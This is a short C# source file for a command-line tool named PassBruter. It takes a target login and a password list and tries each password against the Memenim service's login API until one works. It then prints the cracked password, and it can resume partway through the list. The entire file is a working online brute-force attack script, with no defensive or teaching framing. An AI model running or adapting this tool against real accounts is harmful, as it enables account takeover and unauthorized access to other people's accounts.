using System;
using System.IO;
using System.Collections.Generic;
using Memenim.Core.Api;

namespace PassBruter
{

    internal static class Program
    {
        private static readonly Dictionary<string, string> Arguments = new Dictionary<string, string>();
        private static string _filePath = "passbase.txt";
        private static string _login = "";
        private static bool _showPasswords = false;
        private static int _startPosition = 0;

        private static void Main(string[] args)
        {
            foreach(var arg in args)
            {
                (string, string) tuple = GetArgTuple(arg);
                Arguments.Add(tuple.Item1, tuple.Item2);
            }

            ParseArguments();

            if(string.IsNullOrEmpty(_login) || string.IsNullOrEmpty(_filePath))
            {
                Console.WriteLine("Failed to start");
                return;
            }

            string[] passwordsBase = File.ReadAllLines(_filePath);
            bool foundPass = false;

            while (!foundPass)
            {
                if(_startPosition >= passwordsBase.Length)
                    break;

                var operation = UserApi.Login(
                    _login, passwordsBase[_startPosition]);

                if(_showPasswords)
                {
                    Console.WriteLine(passwordsBase[_startPosition]);
                }
                else
                {
                    Console.Clear();
                    Console.WriteLine($"Progress {_startPosition + 1}/{passwordsBase.Length}");
                }

                if (!operation.Result.IsError)
                {
                    Console.WriteLine($"Pass for {_login} found {passwordsBase[_startPosition]}");
                    foundPass = true;
                }

                ++_startPosition;
            }

            Console.ReadLine();
        }


        private static void ParseArguments()
        {
            foreach(var arg in Arguments)
            {
                switch(arg.Key)
                {
                    case "login":
                        _login = arg.Value;
                        break;
                    case "passwords":
                        _filePath = arg.Value;
                        break;
                    case "showPasswords":
                        _showPasswords = true;
                        break;
                    case "startPosition":
                        _startPosition = int.Parse(arg.Value);
                        break;
                    default:
                        break;
                }
            }
        }

        private static (string Key, string Value) GetArgTuple(string arg)
        {
            string[] tuple = arg.Split(':');

            if(tuple.Length > 1)
                return (tuple[0], tuple[1]);

            return (tuple[0], "");
        }
    }
}
